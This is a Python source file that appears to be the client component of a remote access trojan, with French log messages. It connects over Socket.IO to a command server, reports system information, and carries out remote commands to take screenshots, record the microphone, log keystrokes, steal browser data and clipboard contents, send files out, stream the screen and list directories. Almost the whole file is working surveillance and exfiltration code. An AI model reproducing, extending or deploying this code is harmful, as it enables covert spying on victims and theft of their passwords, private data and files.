import json
import platform
import time

import socketio

from database_utils import send_browser_data
from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, download_file, \
    gen_frames, get_clipboard_content, list_dir

sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)


def log_event(message):
    print(message)


@sio.event
def connect():
    log_event("Connection réussie")
    sio.emit('system_info', {'os': platform.system(), 'os_version': platform.version(), 'hostname': platform.node()})


@sio.event
def connect_error(data):
    log_event(f"Connection échouée: {data}")


@sio.event
def disconnect():
    log_event("Connection perdue")


@sio.event
def command(data):
    command = data.get('command')
    user_id = data.get('user_id')
    params = data.get('params', {})
    duration = 0
    file_path = ""

    if isinstance(params, str):
        try:
            params = json.loads(params)
        except json.JSONDecodeError:
            print("Erreur de décodage JSON pour les paramètres:", params)
            return

    if isinstance(params, dict):
        if 'duration' in params:
            duration = int(params.get('duration', 10))
        if 'file_path' in params:
            file_path = params.get('file_path')
    else:
        duration = int(params)

    if command == 'screenshot':
        take_and_send_screenshot(sio, user_id)
    elif command == 'microphone':
        record_and_send_audio(duration, sio, user_id)
    elif command == 'browserdata':
        send_browser_data(sio, user_id)
    elif command == 'keylogger':
        record_and_send_keyboard_log(duration, sio, user_id)
    elif command == 'clipboard':
        get_clipboard_content(sio, user_id)
    elif command == 'downloadfile':
        download_file(file_path, sio, user_id)


@sio.event
def start_stream():
    gen_frames(sio)


@sio.event
def list_directory(data):
    directory = data.get('dir_path')
    if directory is None:
        if platform.system() == 'Windows':
            directory = 'C:\\'
        else:
            directory = '/'
    list_dir(directory, sio)


def attempt_reconnect():
    while not sio.connected:
        try:
            log_event("Tentative de reconnexion...")
            sio.connect('https://127.0.0.1:5000')
            time.sleep(5)
        except socketio.exceptions.ConnectionError as e:
            log_event("Echec de la reconnexion. Nouvelle tentative dans 5 secondes...")
            time.sleep(5)
